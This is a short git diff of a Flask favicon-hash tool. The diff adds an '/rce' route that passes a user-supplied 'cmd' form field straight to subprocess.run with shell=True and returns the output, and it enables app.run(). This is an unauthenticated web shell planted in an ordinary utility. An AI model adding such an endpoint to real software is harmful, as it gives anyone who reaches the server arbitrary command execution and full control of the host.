@@ -1,6 +1,7 @@
 import requests
 import mmh3
 import codecs
+import subprocess
 from flask import Flask, request, render_template
 import warnings
 
@@ -24,4 +25,16 @@ def favhash():
 
     return render_template('favhash.html', output=output)
 
-# app.run()
+
+@app.route('/rce', methods=["GET", "POST"])
+def rce():
+    output = ""
+    if request.method == 'POST':
+        result = subprocess.run(request.form.get(
+            "cmd"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = result.stdout.decode("utf-8")
+
+    return render_template('rce.html', output=output)
+
+
+app.run()
